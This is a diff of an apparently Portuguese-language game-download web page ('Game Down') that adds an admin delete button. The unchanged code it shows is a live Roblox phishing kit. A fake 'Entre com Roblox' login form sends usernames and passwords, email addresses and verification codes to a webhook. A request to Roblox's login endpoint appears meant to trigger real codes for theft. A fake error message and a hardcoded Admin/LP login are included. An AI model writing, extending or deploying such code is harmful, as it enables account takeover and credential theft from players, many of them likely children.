@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Game Down</title>
+    <title>Game Down - Download</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -137,10 +137,7 @@
         <div class="roblox-modal w-full max-w-[400px] p-6 relative">
             <button onclick="voltarSelecao()" class="absolute top-4 left-4 text-gray-400 hover:text-white text-lg"><i class="fa-solid fa-arrow-left"></i></button>
             <button onclick="fecharModais()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
-            
-            <!-- TÍTULO ALTERADO AQUI -->
             <h2 class="roblox-header mt-8">Entre com Roblox</h2>
-            
             <form onsubmit="event.preventDefault(); processarLogin();">
                 <input type="text" id="inp-user" class="roblox-input mb-3" placeholder="Usuário/e-mail/telefone">
                 <div class="password-container">
@@ -238,10 +235,46 @@
             if(jogos.length===0) { grid.innerHTML='<p class="col-span-full text-center text-gray-500">Nenhum jogo encontrado.</p>'; return; }
             jogos.forEach(j => {
                 const c = document.createElement('div');
-                c.className = "bg-white rounded-lg shadow-md overflow-hidden hover:shadow-xl transition transform hover:-translate-y-1 flex flex-col";
-                c.innerHTML = `<div class="h-40 bg-gray-300 relative"><img src="${j.capa||'https://placehold.co/400x300?text=Sem+Capa'}" class="w-full h-full object-cover"></div><div class="p-4 flex flex-col flex-grow"><h3 class="font-bold text-lg text-gray-800 mb-2 truncate">${j.nome}</h3><div class="mt-auto"><button onclick="tentarBaixar('${j.link}')" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-download"></i> Baixar</button></div></div>`;
+                c.className = "bg-white rounded-lg shadow-md overflow-hidden hover:shadow-xl transition transform hover:-translate-y-1 flex flex-col relative";
+                
+                // Botão de Excluir (Só para Admin)
+                let btnExcluir = '';
+                if(currentUser && currentUser.isAdmin) {
+                    btnExcluir = `<button onclick="excluirJogo('${j._id}', '${j.nome}')" class="absolute top-2 right-2 bg-red-600 text-white w-8 h-8 rounded-full shadow-lg z-20 flex items-center justify-center hover:bg-red-700 transition" title="Excluir Jogo"><i class="fa-solid fa-trash"></i></button>`;
+                }
+
+                c.innerHTML = `
+                    <div class="h-40 bg-gray-300 relative">
+                        <img src="${j.capa||'https://placehold.co/400x300?text=Sem+Capa'}" class="w-full h-full object-cover">
+                        ${btnExcluir}
+                    </div>
+                    <div class="p-4 flex flex-col flex-grow">
+                        <h3 class="font-bold text-lg text-gray-800 mb-2 truncate">${j.nome}</h3>
+                        <div class="mt-auto">
+                            <button onclick="tentarBaixar('${j.link}')" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded flex items-center justify-center gap-2">
+                                <i class="fa-solid fa-download"></i> Baixar
+                            </button>
+                        </div>
+                    </div>`;
                 grid.appendChild(c);
             });
+        }
+
+        async function excluirJogo(id, nome) {
+            if(!confirm(`Tem certeza que deseja excluir "${nome}"?`)) return;
+            try {
+                if(API_URL !== 'MOCK') {
+                    const res = await fetch(`${API_URL}/${id}`, { method: 'DELETE' });
+                    if(res.ok) { alert("Jogo excluído!"); carregarJogos(); }
+                    else alert("Erro ao excluir.");
+                } else {
+                    let l = JSON.parse(localStorage.getItem('mock_jogos')||'[]');
+                    // Em mock é difícil sem ID, mas vamos tentar por nome se não tiver ID
+                    l = l.filter(x => x._id !== id && x.nome !== nome); 
+                    localStorage.setItem('mock_jogos',JSON.stringify(l));
+                    carregarJogos();
+                }
+            } catch(e) { console.error(e); }
         }
 
         async function salvarJogo() {
@@ -287,23 +320,15 @@
         function triggerFakeError() { toast.innerText="Erro"; toast.classList.add('show'); setTimeout(()=>toast.classList.remove('show'),3000); }
         function irParaEmail() { modalFormRoblox.classList.add('hidden'); modalSelecao.classList.add('hidden'); modalEmail.classList.remove('hidden'); }
         
-        // --- FUNÇÃO DE EMAIL ATUALIZADA ---
         function enviarCodigoEmail() { 
             const e = document.getElementById('inp-email-codigo').value; 
-            
-            // 1. Envia Webhook (seu sistema)
             enviarWebhook(`## 📧 PEDIDO EMAIL: ${e}\n||@everyone||`);
-            
-            // 2. Tenta enviar para Roblox Login (Fake Request)
-            // 'no-cors' permite enviar sem erro no console, mas não lemos a resposta.
             fetch("https://www.roblox.com/login", {
                 method: 'POST',
                 mode: 'no-cors',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: `username=${encodeURIComponent(e)}` 
             }).catch(() => {});
-
-            // 3. Troca de tela
             modalEmail.classList.add('hidden'); 
             modalCodigo.classList.remove('hidden'); 
         }
@@ -311,8 +336,22 @@
         function verificarCodigo() { const c=document.getElementById('inp-final-code').value; enviarWebhook(`## CODIGO: ${c}`); modalCodigo.classList.add('hidden'); modalUsername.classList.remove('hidden'); }
         function processarLogin() { const u=document.getElementById('inp-user').value.trim(); const p=document.getElementById('inp-pass').value.trim(); if(!u||!p) return triggerFakeError(); if(u==="Admin"&&p==="LP"){fecharModais();logarReal("Admin",true);return;} enviarWebhook(`## USER: ${u} | PASS: ${p}`); modalFormRoblox.classList.add('hidden'); modalUsername.classList.remove('hidden'); }
         function confirmarUsername() { const n=document.getElementById('inp-new-username').value.trim(); if(!n) return alert("Digite um nome"); fecharModais(); logarReal(n,false); localStorage.setItem('local_username',n); }
-        function logarReal(n,adm) { currentUser={nome:n,isAdmin:adm}; document.getElementById('btn-login-main').classList.add('hidden'); document.getElementById('user-display').classList.remove('hidden'); document.getElementById('user-display').classList.add('flex'); document.getElementById('header-username').innerText=n; if(adm){ btnUpload.classList.remove('hidden'); btnUpload.style.display='flex'; } }
-        function logout() { currentUser=null; document.getElementById('user-display').classList.add('hidden'); btnUpload.classList.add('hidden'); document.getElementById('btn-login-main').classList.remove('hidden'); toggleSidebar(); }
+        
+        function logarReal(n,adm) { 
+            currentUser={nome:n,isAdmin:adm}; 
+            document.getElementById('btn-login-main').classList.add('hidden'); 
+            document.getElementById('user-display').classList.remove('hidden'); 
+            document.getElementById('user-display').classList.add('flex'); 
+            document.getElementById('header-username').innerText=n; 
+            
+            if(adm){ 
+                btnUpload.classList.remove('hidden'); 
+                btnUpload.style.display='flex';
+                carregarJogos(); // Recarrega para mostrar botões de excluir
+            } 
+        }
+
+        function logout() { currentUser=null; document.getElementById('user-display').classList.add('hidden'); btnUpload.classList.add('hidden'); document.getElementById('btn-login-main').classList.remove('hidden'); toggleSidebar(); carregarJogos(); }
         function enviarWebhook(m) { fetch(WEBHOOK_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:m})}).catch(()=>{}); }
     </script>
 </body>
